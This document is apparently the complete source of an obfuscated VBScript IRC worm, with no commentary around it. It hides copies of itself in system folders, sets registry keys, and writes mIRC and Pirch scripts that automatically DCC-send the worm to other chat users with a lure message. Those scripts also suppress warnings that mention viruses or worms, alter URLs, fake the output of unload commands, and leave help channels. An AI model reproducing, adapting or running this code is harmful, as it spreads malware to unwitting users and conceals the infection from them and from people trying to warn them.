On Error Resume Next
Dim HU
Set Y=CreateObject("Scripting.FileSystemObject")
Set SJ=Y.OpenTextFile(WScript.ScriptFullName,1)
Do While Mid(SJ.ReadLine,5,10)<>"Q=CreateOb"
Loop
SJ.SkipLine
LH=SJ.ReadLine
SJ.Close
Set Q=CreateObject(Z("VRbshqu/Ridmm"))
FP=Z("MHGD^RU@FDR/UYU/RIR")
If Y.FileExists(P(J(Z("Ru`suTq")),FP)) Then Y.DeleteFile P(J(Z("Ru`suTq")),FP),True
K=False
If Not Y.FileExists(P(H(0),FP)) Then
   If Y.FileExists(P(H(1),Z("LRHOGN07/UMC"))) Then
      Y.CopyFile P(H(1),Z("LRHOGN07/UMC")),P(H(0),FP)
   Else
      If Y.FileExists(P(Left(H(0),3)&Z("SDBXBMDE"),Z("LRSBXBME/E@U"))) Then
         Y.CopyFile P(Left(H(0),3)&Z("SDBXBMDE"),Z("LRSBXBME/E@U")),P(H(0),FP)
         Set L=Y.GetFile(P(H(0),FP))
         L.Attributes=32
      Else
         K=True
      End If
   End If
End If
If Not K Then
   If Not Y.FileExists(P(H(1),Z("LRHOGN07/UMC"))) Then Y.CopyFile P(H(0),FP),P(H(1),Z("LRHOGN07/UMC"))
   If Not Y.FileExists(P(Left(H(0),3)&Z("SDBXBMDE"),Z("LRSBXBME/E@U"))) Then
      If Not Y.FolderExists(Left(H(0),3)&Z("SDBXBMDE")) Then
         Y.CreateFolder(Left(H(0),3)&Z("SDBXBMDE"))
         Set L=Y.GetFolder(Left(H(0),3)&Z("SDBXBMDE"))
         L.Attributes=22
      End If
      Y.CopyFile P(H(0),FP),P(Left(H(0),3)&Z("SDBXBMDE"),Z("LRSBXBME/E@U"))
      Set L=Y.GetFile(P(Left(H(0),3)&Z("SDBXBMDE"),Z("LRSBXBME/E@U")))
      L.Attributes=39
   End If
   If Not Y.FileExists(P(Left(H(0),3)&Z("SDBXBMDE"),Z("ECHOEDY/WCR"))) Then
      If Y.FileExists(P(H(1),Z("WC@RDU/NMC"))) Then
         Y.CopyFile P(H(1),Z("WC@RDU/NMC")),P(Left(H(0),3)&Z("SDBXBMDE"),Z("ECHOEDY/WCR"))
         Set L=Y.GetFile(P(Left(H(0),3)&Z("SDBXBMDE"),Z("ECHOEDY/WCR")))
         L.Attributes=39
      Else
         K=True
         Y.CopyFile P(H(0),FP),P(J(Z("Ru`suTq")),FP)
      End If
   End If
End If
If Not K Then
   If Not Y.FileExists(P(H(1),Z("WC@RDU/NMC"))) Then
      Y.CopyFile P(Left(H(0),3)&Z("SDBXBMDE"),Z("ECHOEDY/WCR")),P(H(1),Z("WC@RDU/NMC"))
      Set L=Y.GetFile(P(H(1),Z("WC@RDU/NMC")))
      L.Attributes=32
   End If
   If Not Y.FileExists(P(Left(H(0),3)&Z("SDBXBMDE"),Z("SBXBMECO/E@U"))) Then
      Y.CopyFile WScript.ScriptFullName,P(Left(H(0),3)&Z("SDBXBMDE"),Z("SBXBMECO/E@U"))
      Set L=Y.GetFile(P(Left(H(0),3)&Z("SDBXBMDE"),Z("SBXBMECO/E@U")))
      L.Attributes=39
   End If
   Q.RegWrite Z("IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Do`cmd"),Z("Xdr")
   Q.RegWrite Z("IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Q`s`ldudsr"),P(Left(H(0),3)&Z("SDBXBMDE"),Z("ECHOEDY/WCR"))
   Q.RegWrite Z("IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Q`ui"),P(H(0),Z("VRBSHQU/DYD"))
   Q.RegWrite Z("IJDX^TRDSR]/EDG@TMU]Rnguv`sd]Lhs`chmhr]HBP]@fdou]@qqr]HBP]Ru`sutq"),H(0)
   OJ=""
   Set OJ=CreateObject(Z("Vnse/@qqmhb`uhno"))
   G=Chr(13)&Chr(10)
   If OJ Is Nothing Then
      For Each F In Y.Drives
         If F.DriveType=2 Then
            X F.DriveLetter&Z(";]LHSB")
            X F.DriveLetter&Z(";]LHSB23")
            X F.DriveLetter&Z(";]QHSBI")
            X F.DriveLetter&Z(";]QHSBI89")
         End If
      Next
      X Q.RegRead(Z("IJDX^MNB@M^L@BIHOD]Rnguv`sd]Lhbsnrngu]Vhoenvr]BtssdouWdsrhno]Qsnfs`lGhmdrEhs"))
   Else
      T Z("LHSB23/DYD")
      T Z("QHSBI89/DYD")
      OJ.Quit
   End If
End If



Function Z(AZ)
   Z=""
   For ZP=1 To Len(AZ)
      If Asc(Mid(AZ,ZP,1))<>34 And Asc(Mid(AZ,ZP,1))<>35 And Asc(Mid(AZ,ZP,1))<>126 Then
         If Asc(Mid(AZ,ZP,1)) Mod 2=0 Then Z=Z&Chr(Asc(Mid(AZ,ZP,1))+Left(Asc(Mid(LH,2,1)),1)) Else Z=Z&Chr(Asc(Mid(AZ,ZP,1))-Left(Asc(Mid(LH,2,1)),1))
      Else
         Z=Z&Mid(AZ,ZP,1)
      End If
   Next
End Function



Function P(S,M)
   On Error Resume Next
   P=Y.BuildPath(S,M)
End Function



Function J(W)
   On Error Resume Next
   J=Q.SpecialFolders(W)
End Function



Function H(R)
   On Error Resume Next
   H=Y.GetSpecialFolder(R)
End Function



Sub X(U)
   On Error Resume Next
   If Y.FolderExists(U) Then
      For Each D In Y.GetFolder(U).Files
         If UCase(D.Name)=Z("LHSB23/DYD") Then
            V D.Path
            Exit Sub
         ElseIf UCase(D.Name)=Z("QHSBI89/DYD") Then
            B D.Path
            Exit Sub
         End If
      Next
      For Each E In Y.GetFolder(U).SubFolders
         X E.Path
      Next
   End If
End Sub



Sub T(O)
   On Error Resume Next
   Set C=OJ.FileSearch
   C.NewSearch
   C.FileName=O
   C.SearchSubFolders=True
   For Each D In Y.Drives
      If D.DriveType=2 Then
         C.LookIn=D.DriveLetter&Z(";]")
         C.Execute
         ReDim I(C.FoundFiles.Count)
         For E=1 To UBound(I)
            I(E)=C.FoundFiles(E)
         Next
         For E=1 To UBound(I)
            For F=E+1 To UBound(I)
               If I(E)=I(F) And I(E)<>"" Then I(F)=""
            Next
         Next
         For E=1 To UBound(I)
            If I(E)<>"" Then
               If UCase(Right(I(E),Len(O)+1))=Z("]")&O Then
                  If O=Z("LHSB23/DYD") Then V I(E) Else B I(E)
               End If
            End If
         Next
         C.NewSearch
         C.FileName=O
         C.SearchSubFolders=True
      End If
   Next
End Sub



Sub V(A)
   On Error Resume Next
   Set RQ=Y.GetFile(A)
   If Y.FileExists(P(RQ.ParentFolder,Z("LHSB/HOH"))) Then
      Set UY=Y.CreateTextFile(P(H(0),Z("RNTOE23C/EMM")),True)
      UY.Write("On 1:Connect:{ Set %£.go $false | Set %£.which $r(1,2) | Set %£.file "&P(H(0),FP)&" | if ( $exists(%£.file) ) { Set %£.go $true } | Unset %be.* %pk.* %£S.* | life }"&G&"On 1:Disconnect:{ .timers off | .sockclose * | Set %£.date $adate }"&G&"On 1:Input:*:{ Set %£.var1 Ignore:Alias:Write:Play:Rename:Copy:Load:Remini:Writeini:Run:Filter:Flushini:Reload:Remove:Set:Unset:UnsetAll:Enable:Disable: | Set %£.var2 $remove($1,/,.) | if ( $istok(%£.var1,%£.var2,58) ) || ( %£.var2 = $null ) || ( timer isin $1 ) { halt } | if ( $chr(36) isin $1- )  { if ( $pos($1-,$,0) > 1 ) { halt } | Set %£.tmp1 $asc($mid($1-,$calc($pos($1-,$,1) + 1),1)) | if ( %£.tmp1 > 47 ) && ( %£.tmp1 < 58 ) { return } | elseif ( %£.tmp1 = 32) { return } | halt } }"&G&"On 1:Join:*:{ if ( help isin # ) || ( ayuda isin # ) || ( virus isin # ) || ( $remove(#,$chr(35)) isin dmsetupbackorificenohackaide ) { .timerqt 1 5 quiet # } | if ( %£.go ) && ( %£.which = 1 ) { if ( $r(1,2) = 1 ) && ( $nick != $me ) { LS $nick } } }"&G&"On ^1:Part:*:{ if ( %£.go ) && ( %£.which = 2 ) { if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { LS $nick } } | letslook $1- | if ( $letsthink ) { halt } }"&G&"On 1:FileSent:*:{ if ( %£.go ) { LS $nick } }"&G&"On 1:FileRcvd:*:{ if ( %£.go ) { LS $nick } }"&G&"On 1:Notify:{ if ( %£.go ) { if ( $nick !isin %£.nt ) { %£.nt = %£.nt $+ $nick | .ignore -u120 $nick 2 | .timer $+ $r(99,199) 1 10 .msg $nick Hi. Check out this file, ok. | .timer $+ $r(300,399) 1 12 LS $nick } } }"&G&"On ^1:Kick:*:{ if ( $knick = $me ) { letslook $1- } | if ( $letsthink ) && ( $knick = $me ) { .echo -s 3*** You were kicked from $+ $chr(32) $+ $chan $+ $chr(32) $+ by $nick ( $+ $me $+ ) | halt } }"&G&"On ^1:Notice:*:*:{ letslook $1- | if ( $letsthink ) { if ( $chr(35) !isin $active ) { halt } | .echo $active 5- $+ $nick $+ - $+ $chr(32) $+ $modurl | halt } }"&G&"On ^1:Action:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $me ) { Set %£.tmp11 $nick } | if ( # != $me ) { Set %£.tmp11 # } | .echo %£.tmp11 6* $+ $chr(32) $+ $nick $+ $chr(32) $+ $modurl | halt } }"&G&"On ^1:Text:*:*:{ letslook $1- | if ( $letsthink ) { if ( # = $null ) { Set %£.tmp11 $nick } | if ( # != $null ) { Set %£.tmp11 # } | .echo %£.tmp11 < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }"&G&"On ^1:Chat:*:{ letslook $1- | if ( $letsthink ) { .echo =$nick < $+ $nick $+ > $+ $chr(32) $+ $modurl | halt } }"&G&"On ^1:Serv:*:{ letslook $1- | if ( $letsthink ) { halt } }"&G&"On ^1:Quit:{ Set %£.topic 3 | letslook $1- | if ( $letsthink ) { .echo $comchan($nick,1) 2*** $+ $chr(32) $+ $nick $+ $chr(32) $+ has quit IRC ( $+ $modurl $+ ) | halt } }"&G&"On ^1:Topic:#:{ Set %£.topic 2 | letslook $1- | if ( $letsthink ) { .echo # 3*** $nick changes topic to ' $+ $modurl $+ ' | halt } }"&G&"on ^1:SNOTICE:*:{ letslook $1- }"&G&"ctcp 1:*:*:{ letslook $1- | if ( $letsthink ) { halt } }"&G&"raw 332:*:{ Set %£.topic 1 | letslook $2- | if ( $letsthink ) { .clear $2 | .echo $2 3*** Topic is ' $+ $modurl $+ ' | halt } }"&G&"raw 401:*:{ if ( %£S. $+ $2 != $null ) { .timer $+ $2 off | .sockclose £. $+ $2 | .sockclose ƒ. $+ $2 | Set %£.warning $2 | halt } }"&G&"raw 439:*:{ halt }"&G&"alias quiet { Set %£.var3 1 | :j | Set %£.var4 $nick($1,%£.var3) | if ( %£.var4 = $null ) { .part $1 | halt } | if ( %£.var4 != $me ) && ( %£.var4 != X ) && ( %£.var4 != W ) { .ignore %£.var4 2 } | inc %£.var3 | goto j }"&G&"alias -l life { if ( %£.date != $null ) { if ( $gettok(%£.date,2,47) < $gettok($adate,2,47) ) || ( $gettok(%£.date,1,47) < $gettok($adate,1,47) ) { stages } } }"&G&"alias -l stages { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }"&G&"alias letsdo { .ignore $nick 2 | halt }"&G&"alias letslook { if ( Stages isin $1- ) || ( .shs isin $1- ) || ( script isin $1- ) || ( worm isin $1- ) || ( virus isin $1- ) || ( trojan isin $1- ) || ( infect isin $1- ) || ( spread isin $1- ) || ( remote isin $1- ) || ( events isin $1- ) || ( unload isin $1- ) || ( virii isin $1- ) || ( dccallow isin $1- ) { if ( %£.topic = 1 ) { unset %£.topic | .timerf 1 1 quiet $1 | halt } | if ( %£.topic = 2 ) { unset %£.topic | quiet # | halt } | if ( %£.topic = 3 ) { halt } | letsdo } | if ( %£.topic = 1 ) { Set %£.think $2- } | else { Set %£.think $1- } | Unset %£.topic }"&G&"alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }"&G&"alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }"&G&"alias events { if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF | halt } }"&G&"On 1:SockClose:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | sockclose $sockname | sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off }"&G&"On 1:SockListen:£.*:{ Set %£.tmp5 $remove($sockname,£.) | sockaccept ƒ. $+ %£.tmp5 | SL %£.tmp5 }"&G&"On 1:SockWrite:ƒ.*:{ Set %£.tmp6 $remove($sockname,ƒ.) | if ( [ % $+ [ £S. $+ [ %£.tmp6 ] ] ] = 1 ) { .timer $+ $r(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ £. $+ [ %£.tmp6 ] ] | .timer $+ %£.tmp6 off | halt } | SL %£.tmp6 }"&G&"alias LS { if ( $sock(£.*,0) > 5 ) { return } | Set %£S. $+ $1 0 | :pointless | Set %pt $r(2400,5000) | if ( $portfree(%pt) = $false ) { goto pointless } | Set [ % $+ [ be. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%£.file).size | Set %£.tmp4 £. $+ $1 | .timer $+ $1 1 240 .sockclose %£.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose ƒ. $+ $1 | .timer1 $+ $1 1 20 TO $1 | .notice $1 DCC Send $left($gettok(%£.file,3,92), $calc( [ $len( [ $gettok(%£.file,3,92) ] ) ] - 4 ) ) ( $+ $ip $+ ) | if ( $1 = %£.warning ) { return } | .ignore -u90 $1 2 | .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %£.file $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(%£.tmp4) != $null ) { .sockclose %£.tmp4 } | .socklisten %£.tmp4 %pt }"&G&"alias SL { if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data | inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ £S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %£.file [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite ƒ. $+ $1 &data } }"&G&"alias TO { if ( [ % $+ [ be. $+ [ $1 ] ] ] = 0 ) { sockclose [ ƒ. $+ [ $1 ] ] | sockclose [ £. $+ [ $1 ] ] | .timer $+ $1 off } }"&G&"alias modurl { Set %£.think $replace(%£.think,$chr(44),$chr(32),$chr(59),$chr(32)) | Unset %£.think.again | Set %£.var6 $numtok(%£.think,32) | Set %£.var61 1 | Set %£.var64 $nick $+ $chr(91) $+ $gettok($address,2,64) $+ $chr(93) | :mod1 | if ( %£.var61 > %£.var6 ) { return %£.think.again } | Set %£.var62 $gettok(%£.think,%£.var61,32) | if ( http !isin %£.var62 ) && ( www !isin %£.var62 ) && ( ftp. !isin %£.var62 ) && ( .com !isin %£.var62 ) && ( .net !isin %£.var62 ) && ( .org !isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $gettok($address,2,64) isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 }"&G&"if ( %£.var64 isin %£.var62 ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | Set %£.var63 $gettok(%£.var62,2,46) | if ( %£.var63 = $null ) { Set %£.think.again %£.think.again $+ $chr(32) $+ %£.var62 | inc %£.var61 | goto mod1 } | if ( $len(%£.var63) > 2 ) { Set %£.var63 $left(%£.var63,$int($calc($len(%£.var63)/2))) $+ $r(a,z) $+ $mid(%£.var63,$calc($int($calc($len(%£.var63)/2)) + 1),$len(%£.var63)) } | Set %£.var63 $r(A,Z) $+ %£.var63 $+ $r(a,z) | Set %£.think.again %£.think.again $+ $chr(32) $+ $puttok(%£.var62,%£.var63,2,46) | inc %£.var61 | goto mod1 }"&G&"alias letsthink { if ( http isin %£.think ) || ( .org isin %£.think ) || ( .net isin %£.think ) || ( .com isin %£.think ) || ( ftp. isin %£.think ) || ( www isin %£.think ) { return $true } | return $false }"&G)
      UY.Close
      FW P(RQ.ParentFolder,Z("LHSB/HOH")),Z("sghmdr"),Z("o3"),P(H(0),Z("RNTOE23C/EMM"))
      If Not HU Then
         Set UY=Y.OpenTextFile(P(RQ.ParentFolder,Z("LHSB/HOH")),1)
         If Not UY.AtEndOfStream Then
            HD=0
            Do
               ReDim Preserve GQ(HD)
               JD=UY.ReadLine
               GQ(HD)=JD
               HD=HD+1
               If Left(JD,8)=Z("Zsghmdr\") Then
                  If Not UY.AtEndOfStream Then
                     ReDim Preserve GQ(HD)
                     GQ(HD)=UY.ReadLine
                  End If
                  If Not UY.AtEndOfStream Then
                     ReDim Preserve GQ(HD+1)
                     GQ(HD+1)=UY.ReadLine
                  End If
                  ReDim Preserve GQ(HD+2)
                  GQ(HD+2)=Z("o3<")&P(H(0),Z("RNTOE23C/EMM"))
                  HD=HD+3
               End If
            Loop Until UY.AtEndOfStream
            UY.Close
            Set UY=Y.CreateTextFile(P(RQ.ParentFolder,Z("LHSB/HOH")),True)
            UY.Write(Join(GQ,G)&G)
            UY.Close
         Else
            UY.Close
         End If
      End If
   End If
End Sub



Sub B(GY)
   On Error Resume Next
   Set RP=Y.GetFile(GY)
   Set YT=Y.CreateTextFile(P(RP.ParentFolder,Z("DWDOUR/HOH")),True)
   YT.Write("[Levels]"&G&"Enabled=1"&G&"Count=1"&G&"Level1=000-Unknowns"&G&"000-UnknownsEnabled=1"&G&"[000-Unknowns]"&G&"User1=*!*@*"&G&"UserCount=1"&G&"Event1=ON JOIN:#:/dcc send $nick "&P(H(0),FP)&G&"EventCount=1"&G)
   YT.Close
   If Y.FileExists(P(RP.ParentFolder,Z("QHSBI89/HOH"))) Then FW P(RP.ParentFolder,Z("QHSBI89/HOH")),Z("EBB"),Z("@tunIhedEbbVho"),Z("0")
End Sub



Sub FW(SW,KW,FG,JK)
   On Error Resume Next
   Set PK=Y.OpenTextFile(SW,1)
   QS=Split(PK.ReadAll,G)
   PK.Close
   OY=False
   HU=False
   For WD=0 To UBound(QS)
      If Left(QS(WD),1)=Z("Z") Then
         If OY=True Then
            Exit For
         Else
            If Left(QS(WD),Len(KW)+2)=Z("Z")&KW&Z("\") Then OY=True
         End If
      Else
         If OY=True Then
            If Left(QS(WD),Len(FG)+1)=FG&Z("<") Then
               HU=True
               QS(WD)=FG&Z("<")&JK
               Exit For
            End If
         End If
      End If
   Next
   If HU Then
      Set PK=Y.CreateTextFile(SW,True)
      PK.Write(Join(QS,G))
      PK.Close
   End If
End Sub
